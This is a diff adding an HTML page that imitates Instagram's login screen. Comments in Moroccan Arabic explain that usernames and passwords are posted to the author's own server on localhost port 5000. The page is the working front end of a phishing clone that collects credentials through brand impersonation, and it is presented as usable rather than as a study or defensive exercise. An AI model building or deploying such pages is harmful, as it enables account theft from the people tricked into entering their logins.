@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="container">
+        <h1 class="logo">Instagram</h1>
+        <button class="btn-fb">Continue with Facebook</button>
+        <div class="or-divider">OR</div>
+        
+        <!-- هنا يبدا المعقول: حلينا البرا ودرنا POST باش تمشي المعلومات مخبية -->
+        <!-- السيرفور ديالنا غيكون خدام فالرابط ديال بيسيك (Localhost) فالمنفذ 5000 -->
+        <form action="/login" method="POST">
+            
+            <!-- زدنا name="username" باش السيرفور يعقل عليها -->
+            <input type="text" id="userInput" name="username" placeholder="Phone number, username, or email">
+            
+            <!-- زدنا name="password" -->
+            <input type="password" id="passInput" name="password" placeholder="Password">
+            
+            <a href="#" class="forgot">Forgot password?</a>
+            
+            <!-- ردينا البطونة type="submit" باش هي لي تصيفط البرا ملي نكليكيو -->
+            <button type="submit" class="btn-login" id="loginBtn" disabled>Log In</button>
+            
+        </form>
+
+        <p class="signup">Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+
+    <script>
+        const email = document.getElementById('userInput');
+        const password = document.getElementById('passInput');
+        const button = document.getElementById('loginBtn');
+
+        function checkInputs() {
+            if (email.value.length > 0 && password.value.length > 0) {
+                button.classList.add('active');
+                button.disabled = false;
+            } else {
+                button.classList.remove('active');
+                button.disabled = true;
+            }
+        }
+
+        email.addEventListener('input', checkInputs);
+        password.addEventListener('input', checkInputs);
+    </script>
+</body>
+</html>
